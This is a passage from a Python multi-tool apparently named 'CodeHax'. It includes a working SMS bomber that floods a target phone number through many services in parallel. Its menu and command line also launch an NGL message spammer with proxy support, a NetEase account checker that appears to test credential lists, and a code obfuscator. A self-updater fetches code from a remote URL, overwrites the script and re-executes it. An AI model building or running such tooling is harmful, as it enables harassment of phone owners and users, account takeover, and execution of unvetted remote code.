        print(f'⚡ Speed:   {req_per_sec:.1f} req/s')
        print(f'⏰ Time:    {elapsed:.1f}s')
        rating = "EXCELLENT 🏆" if success_rate >= 80 else "GOOD 👍" if success_rate >= 60 else "FAIR 👌" if success_rate >= 40 else "POOR ⚠️"
        print(f'🏆 Rating:  {rating}')
        print('=' * 60)
        self.logger.info(f"SMS mission done: {self.successful_requests}/{self.total_requests} ({success_rate:.1f}%)")

    def start_bombing(self, phone_number: str, total_requests: int):
        """Main entry point for SMS bombing."""
        if not self.validate_phone_number(phone_number):
            print("❌ Invalid phone number. Must be like 09812345678 or 9812345678")
            return
        if total_requests <= 0:
            print("❌ Request count must be positive.")
            return

        formatted_num = self.format_phone_number(phone_number)
        number_to_send = phone_number  # some APIs want raw 09xx

        print('\n' + '=' * 60)
        print('💣 SMS BOMBER ACTIVATED')
        print('=' * 60)
        print(f'📞 Target  : {phone_number}')
        print(f'🎯 Requests: {total_requests}')
        print(f'🔄 Retries : {self.max_retries}')
        print(f'👷 Workers : {self.workers}')
        print('=' * 60)

        self.start_time = time.time()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0

        services = self._get_all_services(formatted_num, number_to_send)
        completed = 0

        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            while completed < total_requests:
                futures = {}
                for func in services:
                    if completed >= total_requests:
                        break
                    future = executor.submit(func)
                    futures[future] = completed
                    completed += 1

                for future in as_completed(futures):
                    try:
                        resp = future.result()
                        self.total_requests += 1
                        if resp.success:
                            self.successful_requests += 1
                            print(f'✅ [{self.total_requests:04d}] {resp.service_name}: SUCCESS (HTTP {resp.status_code})')
                        else:
                            self.failed_requests += 1
                            err = f" - {resp.error_message}" if resp.error_message else ""
                            print(f'❌ [{self.total_requests:04d}] {resp.service_name}: FAILED{err}')
                        if self.total_requests % 5 == 0:
                            self._display_real_time_stats()
                    except Exception as e:
                        self.total_requests += 1
                        self.failed_requests += 1
                        print(f'❌ [{self.total_requests:04d}] Unknown: {str(e)}')

                if completed < total_requests:
                    time.sleep(random.uniform(0.5, 1.5))

        self._display_final_report(number_to_send)

    def run(self):
        """Interactive mode for the SMS bomber."""
        print('\n' + '=' * 60)
        print('💣 SMS BOMBER v1.0')
        print('=' * 60)
        try:
            number = input('📱 Enter target phone number (09xxxxxxxxx): ').strip()
            rqs = input('🎯 How many requests? ').strip()
            total = int(rqs)
            if total > 1000:
                confirm = input('⚠️  High volume – continue? (y/N): ').lower()
                if confirm != 'y':
                    print('Aborted.')
                    return
            self.start_bombing(number, total)
        except ValueError:
            print('❌ Invalid number for requests.')
        except KeyboardInterrupt:
            print('\n⛔ Interrupted.')
            if self.start_time:
                self._display_final_report(number if 'number' in locals() else 'unknown')

# ----------------------------------------------------------------------
# Self‑updater
# ----------------------------------------------------------------------
def self_update(restart: bool = True):
    log.info("Checking for updates...")
    try:
        response = requests.get(UPDATE_URL, timeout=10)
        response.raise_for_status()
        new_code = response.text
        current_path = Path(sys.argv[0])
        current_code = current_path.read_text(encoding="utf-8")
        if new_code == current_code:
            log.info("Already up to date.")
            return False
        log.info("New version found! Updating...")
        tmp_path = current_path.with_suffix(".py.tmp")
        tmp_path.write_text(new_code, encoding="utf-8")
        try:
            compile(new_code, str(tmp_path), "exec")
        except SyntaxError as e:
            log.error(f"Downloaded code contains syntax error: {e}")
            tmp_path.unlink()
            return False
        shutil.move(str(tmp_path), str(current_path))
        log.info("Update applied successfully.")
        if restart:
            log.info("Restarting...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        return True
    except Exception as e:
        log.error(f"Update failed: {e}")
        return False

# ----------------------------------------------------------------------
# Interactive menu (updated with SMS Bomber)
# ----------------------------------------------------------------------
def interactive_menu():
    while True:
        if RICH_AVAILABLE:
            console.clear()
            console.print(ASCII_ART, style="bold cyan")
            console.print(Panel.fit(
                "[bold bright_cyan]🛡️ Universal Python Toolkit[/bold bright_cyan]\n"
                f"v{VERSION} – Obfuscator | Decoder | NGL | NetEase | SMS Bomber",
                border_style="bright_cyan"))
            table = Table(show_header=False, box=None)
            table.add_row("[bold][1][/bold] Decode a file")
            table.add_row("[bold][2][/bold] Obfuscate a file")
            table.add_row("[bold][3][/bold] NGL Spammer")
            table.add_row("[bold][4][/bold] NetEase Account Checker")
            table.add_row("[bold][5][/bold] SMS Bomber")
            table.add_row("[bold][6][/bold] Check for updates")
            table.add_row("[bold][7][/bold] Exit")
            console.print(table)
            choice = rich_prompt("Select", choices=[str(i) for i in range(1,8)], default="1")
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(ASCII_ART)
            print(f"\n=== CodeHax v{VERSION} ===\n"
                  "[1] Decode\n"
                  "[2] Obfuscate\n"
                  "[3] NGL Spammer\n"
                  "[4] NetEase Checker\n"
                  "[5] SMS Bomber\n"
                  "[6] Update\n"
                  "[7] Exit")
            choice = input("Choice: ").strip()

        if choice == "1":
            file_path = rich_prompt("Obfuscated file path")
            decoded = auto_decode(file_path)
            if decoded:
                out_path = Path(file_path).stem + "_decoded.py"
                with open(out_path, "w", encoding="utf-8") as f:
                    f.write(decoded)
                log.info(f"Decoded file saved to {out_path}")
                preview = "\n".join(decoded.splitlines()[:15])
                if len(decoded.splitlines()) > 15:
                    preview += "\n..."
                print(preview)
            else:
                log.error("Decoding failed.")
        elif choice == "2":
            src = rich_prompt("File to obfuscate")
            mode = rich_prompt("Mode (marshal/text)", choices=["marshal", "text"], default="marshal")
            layers = int(rich_prompt("Layers (1-10)", default="1"))
            author = rich_prompt("Author", default="@ItsMeJeff")
            obf = Obfuscator()
            try:
                obf.obfuscate_file(src, mode=mode, layers=layers, author=author)
            except Exception as e:
                log.error(f"Obfuscation failed: {e}")
        elif choice == "3":
            username = rich_prompt("Target username")
            message = rich_prompt("Message")
            quantity = int(rich_prompt("Number of messages", default="10"))
            extra = rich_confirm("Add extra message?", default=False)
            extra_msg = rich_prompt("Extra message") if extra else message
            threads = int(rich_prompt("Threads", default="10"))
            proxies_input = rich_prompt("Proxy list (comma separated) or leave empty", default="")
            proxies = [p.strip() for p in proxies_input.split(",") if p.strip()] if proxies_input else []
            spammer = NGLSpammer(username, message, quantity, extra_msg, proxies, threads)
            spammer.run()
        elif choice == "4":
            threads = int(rich_prompt("Threads", default="10"))
            checker = NeteaseGamesChecker(threads=threads)
            checker.start()
        elif choice == "5":
            bomber = SmsBomber()
            bomber.run()
        elif choice == "6":
            self_update(restart=True)
        elif choice == "7":
            sys.exit(0)
        else:
            print("Invalid choice.")
        input("\nPress Enter to continue...")

# ----------------------------------------------------------------------
# CLI argument parser
# ----------------------------------------------------------------------
def create_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=f"CodeHax v{VERSION} – Multi-tool",
        epilog="Run without arguments for interactive menu."
    )
    subparsers = parser.add_subparsers(dest="command", help="Operation")

    # decode
    dec = subparsers.add_parser("decode", help="Decode obfuscated file")
    dec.add_argument("file")
    dec.add_argument("-o", "--output")

    # obfuscate
    enc = subparsers.add_parser("obfuscate", help="Obfuscate a Python file")
    enc.add_argument("file")
    enc.add_argument("-m", "--mode", choices=["marshal", "text"], default="marshal")
    enc.add_argument("-l", "--layers", type=int, default=1, choices=range(1,11))
    enc.add_argument("-a", "--author", default="@ItsMeJeff")
    enc.add_argument("-o", "--output")

    # ngl
    ngl = subparsers.add_parser("ngl", help="NGL spam")
    ngl.add_argument("username")
    ngl.add_argument("message")
    ngl.add_argument("-q", "--quantity", type=int, default=10)
    ngl.add_argument("-e", "--extra")
    ngl.add_argument("-t", "--threads", type=int, default=10)
    ngl.add_argument("-p", "--proxies", nargs="*")

    # netease
    netease = subparsers.add_parser("netease", help="NetEase account checker")
    netease.add_argument("file")
    netease.add_argument("-t", "--threads", type=int, default=10)

    # sms bomber
    sms = subparsers.add_parser("sms", help="SMS bomber")
    sms.add_argument("number", help="Target phone number (e.g., 09812345678)")
    sms.add_argument("requests", type=int, help="Number of SMS requests")
    sms.add_argument("-t", "--threads", type=int, default=8, help="Concurrent workers (default: 8)")

    # update
    subparsers.add_parser("update", help="Self-update")

    return parser

def main():
    parser = create_parser()
    args = parser.parse_args()

    if args.command is None:
        interactive_menu()
        return

    if args.command == "decode":
        decoded = auto_decode(args.file)
        if decoded:
            out_path = args.output or (Path(args.file).stem + "_decoded.py")
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(decoded)
            log.info(f"Decoded file saved to {out_path}")
        else:
            log.error("Decoding failed.")
            sys.exit(1)

    elif args.command == "obfuscate":
        obf = Obfuscator()
        try:
            out = obf.obfuscate_file(args.file, args.mode, args.layers, args.author)
            if args.output:
                shutil.move(out, args.output)
                log.info(f"Output moved to {args.output}")
        except Exception as e:
            log.error(f"Obfuscation failed: {e}")
            sys.exit(1)

    elif args.command == "ngl":
        spammer = NGLSpammer(
            username=args.username, message=args.message,
            quantity=args.quantity, extra_message=args.extra,
            proxies=args.proxies or [], threads=args.threads
        )
        spammer.run()

    elif args.command == "netease":
        checker = NeteaseGamesChecker(threads=args.threads)
        checker.start(filename=args.file)

    elif args.command == "sms":
        bomber = SmsBomber(workers=args.threads)
        bomber.start_bombing(args.number, args.requests)

    elif args.command == "update":
        updated = self_update(restart=True)
        if not updated:
            sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("Interrupted by user")
        sys.exit(1)
